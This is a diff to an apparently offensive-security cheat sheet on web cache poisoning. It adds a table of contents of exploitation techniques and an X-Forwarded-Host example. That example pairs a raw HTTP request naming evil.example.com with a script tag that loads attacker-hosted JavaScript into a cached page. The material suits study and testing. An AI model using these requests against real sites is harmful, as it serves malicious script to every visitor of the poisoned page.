@@ -1,3 +1,28 @@
+## Table of Contents
+
+1. [Detecting Cached Responses](#detecting-cached-responses)
+2. [Explanation of Keyed and Unkeyed](#Explanation-of-Keyed-and-Unkeyed)
+3. [Exploiting Cache Design Flaws](#exploiting-cache-design-flaws)
+   - [XSS via Unkeyed Headers](#using-web-cache-poisoning-to-deliver-an-xss-attack)
+   - [Unkeyed Header Poisoning](#web-cache-poisoning-with-an-unkeyed-header)
+   - [Unkeyed Cookie Poisoning](#web-cache-poisoning-with-an-unkeyed-cookie)
+   - [Multiple Header Poisoning](#web-cache-poisoning-with-multiple-headers)
+   - [Targeted Poisoning with Unknown Headers](#targeted-web-cache-poisoning-using-an-unknown-header)
+   - [Exploiting DOM-Based Vulnerabilities](#using-web-cache-poisoning-to-exploit-dom-based-vulnerabilities)
+   - [Chaining Vulnerabilities](#chaining-web-cache-poisoning-vulnerabilities)
+4. [Exploiting Cache Key Implementation Flaws](#exploiting-cache-key-implementation-flaws)
+   - [Unkeyed Port](#exploiting-unkeyed-port)
+   - [Unkeyed Query String](#exploiting-an-unkeyed-query-string)
+   - [Unkeyed Query Parameter](#exploiting-an-unkeyed-query-parameter)
+   - [Cache Parameter Cloaking](#exploiting-with-cache-parameter-cloaking)
+   - [Fat GET Support](#exploiting-fat-get-support)
+   - [Dynamic Content in Resource Imports](#exploiting-dynamic-content-in-resource-imports)
+   - [Normalized Cache Keys](#normalized-cache-keys)
+   - [Cache Key Injection](#cache-key-injection)
+5. [Poisoning Internal Caches](#poisoning-internal-caches)
+
+---
+
 ## **Detecting Cached Responses**
 
 Add a cache buster parameter ```?cb=1``` in the request. Change the number in the parameter before new request, so that we don't get a cached response. 
@@ -34,37 +59,35 @@ Additionally, check `Cache-Control` headers for caching directives like `public`
 
 # Explanation of Keyed and Unkeyed
 
-***Keyed (Secure):***
+### ✅ **Keyed (Secure)**
 
-In Keyed scenario, if an attacker request the path given below,<br>
-<br>
-**Attackers Request:**
-```
-GET /profile?cb=xss HTTP/1.1
-```
-the attackers payload will not be cached under the ```/profile```.<br>
-<br>
-**Victims Request**
-```
-GET /profile HTTP/1.1
-```
-So, victims request will not get the attackers cached response.
+- **Definition**: The cache differentiates responses based on the **full request**, including query parameters (and sometimes headers like `User-Agent`, `Cookie`, etc.).
+- **Behavior**:
+  - Attacker sends:  
+    `GET /profile?cb=xss HTTP/1.1`
+  - This request is cached **under that exact URL** `/profile?cb=xss`
+  - When the victim requests:  
+    `GET /profile HTTP/1.1`
+  - They get a **fresh, uncached response**, **not affected** by the attacker's request.
 
-***Unkeyed (Vulnerable):***
+✔️ **Result**: Safe. Payloads from different URLs are not reused for other users.
 
-In Unkeyed scenario, if an attacker request the path given below,<br>
-<br>
-**Attackers Request:**
-```
-GET /profile?cb=xss HTTP/1.1
-```
-the attackers payload will be cached under the ```/profile```.<br>
-<br>
-**Victims Request**
-```
-GET /profile HTTP/1.1
-```
-So, victims request will get the attackers cached response.
+---
+
+### ❌ **Unkeyed (Vulnerable)**
+
+- **Definition**: The cache treats different URLs (like `/profile` and `/profile?cb=xss`) as the **same key**, ignoring certain parts of the request like query parameters or headers.
+- **Behavior**:
+  - Attacker sends:  
+    `GET /profile?cb=xss HTTP/1.1`
+  - The response (with payload, e.g. reflected XSS) is cached **under the path `/profile`**
+  - Victim requests:  
+    `GET /profile HTTP/1.1`
+  - They receive the **poisoned cached response**.
+
+❗ **Result**: Vulnerable to **Web Cache Poisoning**, where attacker poisons the cache to serve malicious content to others.
+
+---
 
 # Exploiting cache design flaws
 
@@ -103,16 +126,26 @@ If this response was cached, all users who accessed /en?region=uk would be serve
 Some websites use unkeyed headers to dynamically generate URLs for importing resources, such as externally hosted JavaScript files. In this case, if an attacker changes the value of the appropriate header to a domain that they control, they could potentially manipulate the URL to point to their own malicious JavaScript file instead. We can use ```X-Forwarded-Host:``` header for this.
 
 **Step**
-```
+
   1. Add a cache buster parameter ?cb=1 in the request.
   2. Add X-forwarded-Host header in request.
-  3. Add a arbitrary domain (example.com) and send the request.
-  4. If the example.com reflected in response page, we can now place our malicious link in it.
+  3. Add a arbitrary domain (evil.example.com) and send the request.
+  4. If the evil.example.com reflected in response page, we can now place our malicious link in it.
+
+```http
+GET /assets/js/main.js?cb=1 HTTP/1.1
+Host: vulnerable-website.com
+X-Forwarded-Host: evil.example.com
 ```
+
 The malicius link contain with js file will trigger on all users browser if the site is vulnerable to the Web Cache Poisoning.
-<br>
-<br>
+
+```js
+<script src="https://evil.example.com/assets/js/main.js"></script>
+```
+
 **Note:** Remove cache buster before delivering final attack.
+
 ## Web cache poisoning with an unkeyed cookie
 
 Cookies are often used to dynamically generate content in a response. If the response of the request is cached, then all subsequent users who tried to access the poisoned page will get the malicious content. 
